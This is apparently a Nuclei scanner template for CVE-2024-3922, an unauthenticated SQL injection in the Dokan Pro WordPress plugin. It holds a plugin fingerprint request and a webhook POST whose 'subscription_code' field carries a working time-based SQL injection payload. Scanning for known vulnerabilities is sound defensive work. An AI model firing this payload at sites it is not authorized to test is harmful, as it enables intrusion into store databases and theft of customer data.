id: CVE-2024-3922

info:
  name: Dokan Pro <= 3.10.3 - SQL Injection
  author: s4e-io
  severity: critical
  description: |
    The Dokan Pro plugin for WordPress is vulnerable to SQL Injection via the 'code' parameter in all versions up to, and including, 3.10.3 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query.
  impact: |
    Unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.
  remediation: |
    Fixed in 3.11.0
  reference:
    - https://dokan.co/docs/wordpress/changelog/
    - https://nvd.nist.gov/vuln/detail/CVE-2024-3922
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/d9de41de-f2f7-4b16-8ec9-d30bbd3d8786?source=cve
    - https://github.com/nomi-sec/PoC-in-GitHub
    - https://github.com/truonghuuphuc/CVE-2024-3922-Poc
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10
    cve-id: CVE-2024-3922
    cwe-id: CWE-89
    epss-score: 0.89672
    epss-percentile: 0.99524
    cpe: cpe:2.3:a:dokan:dokan_pro_plugin:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: dokan
    product: dokan_pro_plugin
    framework: wordpress
    publicwww-query: "/wp-content/plugins/dokan-pro/"
  tags: time-based-sqli,cve,cve2024,dokan,wp-plugin,wordpress,wp,dokan-pro,sqli,wedevs
flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /wp-content/plugins/dokan-pro/changelog.txt HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        words:
          - "Dokan product"
        internal: true

  - raw:
      - |
        @timeout: 20s
        POST /wp-admin/admin.php?webhook=dokan-moip HTTP/1.1
        Host: {{Hostname}}

        {"env":"1","event":"invoice.created","resource":{"subscription_code":"11111' and (select 1 from (select sleep( if(1=1,6,0) ))x )='"}}

    matchers:
      - type: dsl
        dsl:
          - "duration>=6"
          - "status_code == 302"
        condition: and
# digest: 4b0a0048304602210097f9d35eb126ad4973b21261fe38d7f39f4525f526e79a39fc351e72b3d4823c022100bad8219c1906c75427c7a8d878a6094f5ecc05d469376e2beaa1a76cd0e425f8:922c64590222798bb761d5b6d8e72950